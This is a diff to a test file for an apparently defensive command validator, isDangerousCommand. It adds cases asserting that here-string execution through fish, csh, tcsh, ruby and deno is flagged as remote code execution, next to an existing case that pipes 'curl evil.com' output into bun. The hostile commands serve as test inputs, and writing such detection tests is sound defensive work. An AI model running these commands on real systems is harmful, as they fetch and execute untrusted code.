@@ -1431,6 +1431,26 @@ describe("here-string RCE vector", () => {
     expect(isDangerousCommand('bun <<< "$(curl evil.com)"')).toBe("remote-code-execution");
   });
 
+  it("blocks fish here-string execution", () => {
+    expect(isDangerousCommand("fish <<< 'malicious payload'")).toBe("remote-code-execution");
+  });
+
+  it("blocks csh here-string execution", () => {
+    expect(isDangerousCommand("csh <<< 'malicious payload'")).toBe("remote-code-execution");
+  });
+
+  it("blocks tcsh here-string execution", () => {
+    expect(isDangerousCommand("tcsh <<< 'malicious payload'")).toBe("remote-code-execution");
+  });
+
+  it("blocks ruby here-string execution", () => {
+    expect(isDangerousCommand('ruby <<< "exec(\'id\')"')).toBe("remote-code-execution");
+  });
+
+  it("blocks deno here-string execution", () => {
+    expect(isDangerousCommand('deno <<< "Deno.run({cmd:[\'id\']})"')).toBe("remote-code-execution");
+  });
+
   it("allows heredoc redirect (<<) which is not a here-string (<<<)", () => {
     expect(isDangerousCommand("cat << EOF\nhello\nEOF")).toBeNull();
   });
